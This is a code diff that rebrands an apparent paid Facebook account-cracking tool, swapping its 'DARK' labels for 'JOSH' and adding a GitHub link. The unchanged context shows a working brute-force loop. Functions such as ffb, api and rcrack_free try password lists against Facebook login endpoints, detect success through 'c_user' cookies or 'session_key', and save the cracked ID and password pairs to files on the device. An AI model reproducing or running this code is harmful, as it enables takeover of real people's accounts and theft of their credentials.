@@ -79,7 +79,7 @@ logo = ("""
  \033[1;91m888P"                                \033[1;91m
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ┃  FACEBOOK : Josh
- ┃  GITHUB : NOT FOUND
+ ┃  GITHUB : https://github.com/Joshhi1
  ┃  TYPE OF TOOL : PAID
  ┃  VERSION : 0.2       
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
@@ -99,10 +99,10 @@ correct_username = 'Joshtest'
 key = 'true'
 
 while key == 'true':
-    username = input('\33[0;97m[vione]\33[1;96m~~~~~>\33[1;92mPLEASE ENTER KEY\33[1;91m: ')
+    username = input('\33[0;97m[josh]\33[1;96m~~~~~>\33[1;92mPLEASE ENTER KEY\33[1;91m: ')
 
     if username == correct_username:
-        print('\33[1;37m-----------------------------------------------\33[0;97m[•]\33[1;32m WELCOME TO VIONE HUESSEV TOOL ')
+        print('\33[1;37m-----------------------------------------------\33[0;97m[•]\33[1;32m WELCOME TO JOSH TOOL ')
         time.sleep(1)
         # Assuming clear() is a function to clear the screen
         clear()
@@ -187,7 +187,7 @@ def Spy():
 					crack_submit.submit(api1,ids,names,passlist)
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [DARK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [JOSH] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -208,15 +208,15 @@ def ffb(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [DARK-BUHAY] %s | %s'%(ids,pas))
-                                open(f'/sdcard/DARK-BUHAY.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\033[1;32m [JOSH-ALIVE] %s | %s'%(ids,pas))
+                                open(f'/sdcard/JOSH-ALIVE.txt', 'a').write(ids+'|'+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [DARK-PATAY] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/DARK-PATAY.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [JOSH-DEAD] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/JOSH-DEAD.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -267,15 +267,15 @@ def ffb1(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [DARK-BUHAY] %s | %s'%(ids,pas))
+                                print(f'\r\r\033[1;32m [JOSH-ALIVE] %s | %s'%(ids,pas))
                                 #cek_apk(session,coki)
-                                open(f'/sdcard/DARK-BUHAY.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/JOSH-ALIVE.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [DARK-PATAY] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/DARK-PATAY.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [JOSH-DEAD] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/JOSH-DEAD.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -289,7 +289,7 @@ def ffb1(ids,names,passlist):
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [DARK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [JOSH] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(f' ')[0]
                         try:
                                 ln = names.split(f' ')[1]
@@ -339,8 +339,8 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [DARK-BUHAY] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/DARK-BUHAY.txt','a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;32m [JOSH-ALIVE] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/JOSH-ALIVE.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
@@ -410,19 +410,19 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [DARK-BUHAY] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/DARK-BUHAY.txt','a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;32m [JOSH-ALIVE] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/JOSH-ALIVE.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [DARK-PATAY] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/DARK-PATAY.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r\x1b[38;5;126m [JOSH-DEAD] '+ids+' | '+pas+'\033[1;97m')
+                                                open(f'/sdcard/JOSH-DEAD.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open(f'/sdcard/DARK-PATAY.txt','a').write(ids+'|'+pas+'\n')
+                                                open(f'/sdcard/JOSH-DEAD.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -552,7 +552,7 @@ def rcrack_free(idf,pwv):
 		for ps in pwv:
 	#		print(idf+'|'+ps)
 			#session = requests.Session()
-			sys.stdout.write(f'\r\r\033[1;37m [DARK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write(f'\r\r\033[1;37m [JOSH] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			pro = random.choice(useragent)
 			free_fb = session.get('https://m.alpha.facebook.com').text
